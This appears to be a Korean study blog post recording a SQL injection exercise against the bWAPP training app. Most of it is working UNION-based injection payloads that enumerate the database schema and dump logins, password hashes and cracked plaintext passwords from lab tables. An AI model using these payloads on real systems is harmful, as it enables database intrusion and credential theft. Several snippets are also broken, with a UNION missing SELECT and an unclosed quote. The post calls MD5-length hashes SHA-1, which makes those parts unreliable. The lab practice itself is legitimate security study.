---
layout: post
title: "sql ingection(bWAPP) test"
date: 2026-11-05
categories: ["cyber-security", "sql"]
notion_source: "https://app.notion.com/p/sql-ingection-bWAPP-test-40faa16a5aa48068bc63e242c31621a7"
---
0' union select 1,table_schema,column_name,4,5,6 from information_schema.columns where table_schema='bWAPP' and table_name='cisco' #

SELECT * FROM movies WHERE title LIKE '%' OR 1=1 -- %';

SELECT * FROM movies WHERE title LIKE '%' OR 1=1';

%가 앞에 붙으면 해당 문자열로 끝나는 문자를 매칭시키는거고
%가 뒤에 붙으면 해당 문자열로 시작하는 문자들이 매칭된다.

LIKE 검색 알고리즘은 추후에 알아본다.

LIKE %I ---> I로 끝나는 문자 매칭
LIKE I% ---> I로 시작하는 문자 매칭
LIKE %I% ----> I가 들어간 모든 문자 매칭

```sql
SELECT * FROM movies 

WHERE title 

LIKE '%'AND 1=0 

UNION 1,

TABLE_NAME,

COLUMN_NAME,

DATA_TYPE,

NULL,NULL,

ORDINAL_POSITION 

FROM information_schema.COLUMNS

WHERE TABLE_SCHEMA='testdb'

AND TABLE_NAME='cisco;
```

' #%';

- - 가 뒤의 %';를 주석으로 만들어 정상적인 SQL이 된다.
입력	뒤에 남는 코드 처리	결과
' OR 1=1	%';가 그대로 남음	문법 오류
' OR 1=1 --	%';가 주석 처리됨	실행 가능

sql 원형

```plain text
SELECT * FROM movies WHERE title LIKE '%입력값%';
```

실제 완성되는 구문

```sql
SELECT * 

FROM movies 

WHERE title LIKE '%' 

UNION SELECT 1,login,password,username,NULL,NULL,NULL 

FROM testdb.cisco; #%'
```

**1. movies의 출력 컬럼 수 확인**

sql ingection은 기본적으로 union을 활용하기 때문에 기준 테이블의 컬럼 갯수와 맞아야 한다. union은 **두 조회 결과를 하나의 표로 합치기 때문이다. **SELECT 뒤의 값 개수를 늘려가며 오류가 사라지는지 확인한다.

```plain text
' UNION SELECT 1 #
```

```plain text
' UNION SELECT 1,2 #
```

![Notion 이미지 1]({{ '/assets/images/posts/2026-11-05-sql-ingection-bwapp-test/01-40faa16a.png' | relative_url }})

같은 방식으로 늘리면, 현재 movies에서는 **7개일 때 컬럼 수가 맞다.**

```plain text
' AND 1=0 UNION SELECT 1,2,3,4,5,6,7 #
```

화면에 보이는 숫자는 이후 데이터를 표시할 수 있는 출력 위치이다. 이 컬럼들을 이용해서 다른 데이터베이스의 테이블을 union 하여 출력결과를 쌓는다.

![Notion 이미지 2]({{ '/assets/images/posts/2026-11-05-sql-ingection-bwapp-test/02-40faa16a.png' | relative_url }})

확인을 해보면 현재 조회 테이블은 7개의 컬럼을 사용하는 것을 확인할 수 있다. Title에는 2번 컬럼, Release에는 3번 컬럼, Character에는 5번 컬럼, Genre에는 4번 컬럼, IMDb에는 Link?

**2. 데이터베이스 이름 확인**

**UNION은 두 SELECT의 조회 결과를 위아래로 합치기 위해 사용.**

지금 실습에서는 **영화 검색 결과에 cisco 조회 결과를 추가해서 같은 출력 화면에 표시**하는 역할입니다.

현재 계정에서 볼 수 있는 DB 목록을 확인할 수 있다. 

```plain text
'AND 1=0 UNION SELECT 1,SCHEMA_NAME,NULL,NULL,NULL,NULL,NULL FROM information_schema.SCHEMATA #
```

| information_schema |  |  |  | [**Link**](http://www.imdb.com/title/) |

| --- | --- | --- | --- | --- |

| bWAPP |  |  |  | [**Link**](http://www.imdb.com/title/) |

| drupageddon |  |  |  | [**Link**](http://www.imdb.com/title/) |

| mysql |  |  |  | [**Link**](http://www.imdb.com/title/) |

| testdb |  |  |  | [**Link**](http://www.imdb.com/title/) |

**`information_schema`****는 MySQL의 데이터베이스·테이블·컬럼·권한 같은 구조 정보를 조회하는 메타데이터용 데이터베이스**

영화 제목이나 사용자 비밀번호 같은 실제 데이터보다는 **“어떤 테이블에 어떤 컬럼이 있는가”**를 알려줍니다.

| 주요 테이블 | 담긴 정보 | 주요 컬럼 |

| --- | --- | --- |

| `SCHEMATA` | 데이터베이스 목록 | `SCHEMA_NAME` |

| `TABLES` | 테이블·뷰 목록, 엔진 등 | `TABLE_SCHEMA`, `TABLE_NAME`, `TABLE_TYPE`, `ENGINE` |

| `COLUMNS` | 컬럼 이름·자료형·순서·기본값 등 | `TABLE_SCHEMA`, `TABLE_NAME`, `COLUMN_NAME`, `COLUMN_TYPE`, `ORDINAL_POSITION` |

| `STATISTICS` | 인덱스 구성 | `INDEX_NAME`, `COLUMN_NAME`, `SEQ_IN_INDEX`, `NON_UNIQUE` |

| `TABLE_CONSTRAINTS` | 기본 키·외래 키·고유 제약조건 종류 | `CONSTRAINT_NAME`, `CONSTRAINT_TYPE` |

| `KEY_COLUMN_USAGE` | 제약조건에 참여하는 컬럼과 참조 대상 | `COLUMN_NAME`, `REFERENCED_TABLE_NAME`, `REFERENCED_COLUMN_NAME` |

| `VIEWS` | 뷰 정의 | `TABLE_SCHEMA`, `TABLE_NAME`, `VIEW_DEFINITION` |

| `TRIGGERS` | 트리거 정의·실행 시점 | `TRIGGER_NAME`, `EVENT_MANIPULATION`, `ACTION_TIMING` |

| `ROUTINES` | 저장 프로시저·함수 정보 | `ROUTINE_NAME`, `ROUTINE_TYPE` |

| `USER_PRIVILEGES` | 전역 권한 정보 | `GRANTEE`, `PRIVILEGE_TYPE` |

+---------------------------------------+
\| Tables_in_information_schema          \|
+---------------------------------------+
\| CHARACTER_SETS                             \|
\| COLLATIONS                                     \|
\| COLLATION_CHARACTER_SET_APPLICABILITY \|
\| COLUMNS            ————————————>  컬럼 이름·자료형·순서·기본값 등
\| COLUMN_PRIVILEGES                       \|
\| KEY_COLUMN_USAGE                       \|
\| PROFILING                                        \|
\| ROUTINES                                         \|
\| SCHEMATA           ————————————> 데이터베이스 목록(testdb, cisco, linux)
\| SCHEMA_PRIVILEGES                        \|
\| STATISTICS                                        \|
\| TABLES                 ————————————> 테이블·뷰 목록, 엔진 등
\| TABLE_CONSTRAINTS                       \|
\| TABLE_PRIVILEGES                            \|
\| TRIGGERS                                         \|
\| USER_PRIVILEGES                             \|
\| VIEWS                                               \|
+---------------------------------------+
17 rows in set (0.00 sec)

**3. testdb의 테이블을 활용해서 information_schema테이블에 union 해서 정보 확인**

```plain text
' UNION SELECT 1,TABLE_NAME,NULL,NULL,NULL,NULL,NULL FROM information_schema.TABLES WHERE TABLE_SCHEMA='testdb' #
```

| cisco |  |  |  | [**Link**](http://www.imdb.com/title/) |

| --- | --- | --- | --- | --- |

| linux |  |  |  | [**Link**](http://www.imdb.com/title/) |

| security |  |  |  | [**Link**](http://www.imdb.com/title/) |

3.5 cisco 테이블의 구조를 information_schema 테이블에 저장된 schema (데이터베이스 목록). columns를 조회

```javascript
0' union select 1,table_schema,column_name,4,5,6 from information_schema.columns where table_schema='bWAPP' and table_name='cisco' #

```

**4. 각 테이블의 컬럼 이름과 자료형 확인**

table_schema는 데이터베이스 정보 목록. testdb를 선택하고, table_name이 맞는걸 선택

cisco

```plain text
'AND 1=0 UNION SELECT 1,TABLE_NAME,COLUMN_NAME,DATA_TYPE,NULL,NULL,ORDINAL_POSITION FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='testdb' AND TABLE_NAME='cisco' #
```

linux:

```plain text
'AND 1=0 UNION SELECT 1,TABLE_NAME,COLUMN_NAME,DATA_TYPE,NULL,NULL,ORDINAL_POSITION FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='testdb' AND TABLE_NAME='linux' #
```

security

```plain text
'AND 1=0 UNION SELECT 1,TABLE_NAME,COLUMN_NAME,DATA_TYPE,NULL,NULL,ORDINAL_POSITION FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='testdb' AND TABLE_NAME='security' #
```

출력 순서는 보장되지 않으므로, 마지막 위치의 ORDINAL_POSITION으로 원래 컬럼 순서를 확인

linux 테이블 컬럼 구조 

| linux | id |  | int | [**Link**](http://www.imdb.com/title/) |

| --- | --- | --- | --- | --- |

| linux | login |  | varchar | [**Link**](http://www.imdb.com/title/) |

| linux | password |  | varchar | [**Link**](http://www.imdb.com/title/) |

| linux | username |  | varchar | [**Link**](http://www.imdb.com/title/) |

| linux | age |  | int | [**Link**](http://www.imdb.com/title/) |

cisco 테이블 컬럼 구조 

| **Title** | **Release** | **Character** | **Genre** | **IMDb** |

| --- | --- | --- | --- | --- |

| cisco | id |  | int | [**Link**](http://www.imdb.com/title/) |

| cisco | login |  | varchar | [**Link**](http://www.imdb.com/title/) |

| cisco | password |  | varchar | [**Link**](http://www.imdb.com/title/) |

| cisco | username |  | varchar | [**Link**](http://www.imdb.com/title/) |

| cisco | age |  | int | [**Link**](http://www.imdb.com/title/) |

security 테이블 컬럼 구조 

| **Title** | **Release** | **Character** | **Genre** | **IMDb** |

| --- | --- | --- | --- | --- |

| security | id |  | int | [**Link**](http://www.imdb.com/title/) |

| security | login |  | varchar | [**Link**](http://www.imdb.com/title/) |

| security | password |  | varchar | [**Link**](http://www.imdb.com/title/) |

| security | username |  | varchar | [**Link**](http://www.imdb.com/title/) |

| security | age |  | int | [**Link**](http://www.imdb.com/title/) |

**5. 확인된 컬럼으로 데이터 조회**

**의 영화 조회 조건을 거짓으로 만들면 ****`cisco`**** 데이터만 출력된다** bWAPP 입력창에 넣으세요.

- `AND 1=0` : 원래 `movies` 조회 결과를 0행으로 만듭니다.

- `UNION ALL SELECT ...` : `cisco`의 행을 추가합니다.

- `#` : 원래 SQL의 남은 부분을 주석 처리합니다.

현재 화면 기준으로는 다음 위치에 표시됩니다.

cisco는 실제로 확인한 login, password, username을 사용한다.

```plain text
' AND 1=0 UNION ALL SELECT 1,login,password,username,NULL,NULL,NULL FROM testdb.cisco #
```

| **Title** | **Release** | **Character** | **Genre** | **IMDb** |

| --- | --- | --- | --- | --- |

| cisco1 | cisco1111 |  | kim jung woo | [**Link**](http://www.imdb.com/title/) |

| cisco2 | cisco2222 |  | kim jung soo | [**Link**](http://www.imdb.com/title/) |

| cisco3 | cisco3333 |  | kim jung ah | [**Link**](http://www.imdb.com/title/) |

linux

```plain text
' AND 1=0 UNION ALL SELECT 1,login,password,username,NULL,NULL,NULL FROM testdb.linux #
```

| **Title** | **Release** | **Character** | **Genre** | **IMDb** |

| --- | --- | --- | --- | --- |

| linux1 | 1fee615b09949f90b702519072e45afa |  | lee jung woo | [**Link**](http://www.imdb.com/title/) |

| linux2 | 2ea1acb089a098b871a3fc0dbf059e9b |  | lee jung soo | [**Link**](http://www.imdb.com/title/) |

| linux3 | 7aafb1a08847d772dcc54f8255a13949 |  | lee jung ah | [**Link**](http://www.imdb.com/title/) |

최종적으로 해시 패스워드를 얻어냈고 크래킹 결과 sha1계열임과 salt값이 들어가있지 않다는것을 확인할 수 있다. 

- linux1 계정 lee jung woo

- hashed password: 1fee615b09949f90b702519072e45afa

- plain text password: linux1111

- linux2 계정 lee jung soo

- hashed password: 2ea1acb089a098b871a3fc0dbf059e9b

- plain text password: linux2222

- linux3 계정  lee jung ah

- hashed password: 7aafb1a08847d772dcc54f8255a13949

- plain text passowrd: linux 3333

![Notion 이미지 3]({{ '/assets/images/posts/2026-11-05-sql-ingection-bwapp-test/03-40faa16a.png' | relative_url }})

![Notion 이미지 4]({{ '/assets/images/posts/2026-11-05-sql-ingection-bwapp-test/04-40faa16a.png' | relative_url }})

![Notion 이미지 5]({{ '/assets/images/posts/2026-11-05-sql-ingection-bwapp-test/05-40faa16a.png' | relative_url }})

- security 계정 

```plain text
' AND 1=0 UNION ALL SELECT 1,login,password,username,NULL,NULL,NULL FROM testdb.security #
```

| **Title** | **Release** | **Character** | **Genre** | **IMDb** |

| --- | --- | --- | --- | --- |

| security1 | 9da88abdc73b137b86ddee924d572430f54244ca |  | park jung woo | [**Link**](http://www.imdb.com/title/) |

| security2 | 51a3e131329157c7def8130a3a9a882805d58a2e |  | park jung soo | [**Link**](http://www.imdb.com/title/) |

| security3 | 1537f36e8d10cddce37dd3c2c6ee14f4ed8ebe20 |  | park jung ah | [**Link**](http://www.imdb.com/title/) |

- security1 계정 park jung woo

- hashed password: 9da88abdc73b137b86ddee924d572430f54244ca

- plain text password: security11

- security2 계정 park jung soo

- hashed password: 51a3e131329157c7def8130a3a9a882805d58a2e

- plain text password: securit22

- security13계정 park jung ah

- hashed password: 1537f36e8d10cddce37dd3c2c6ee14f4ed8ebe20

- plain text passowrd: security33

![Notion 이미지 6]({{ '/assets/images/posts/2026-11-05-sql-ingection-bwapp-test/06-40faa16a.png' | relative_url }})

![Notion 이미지 7]({{ '/assets/images/posts/2026-11-05-sql-ingection-bwapp-test/07-40faa16a.png' | relative_url }})

![Notion 이미지 8]({{ '/assets/images/posts/2026-11-05-sql-ingection-bwapp-test/08-40faa16a.png' | relative_url }})

원본: [Notion](https://app.notion.com/p/sql-ingection-bWAPP-test-40faa16a5aa48068bc63e242c31621a7)
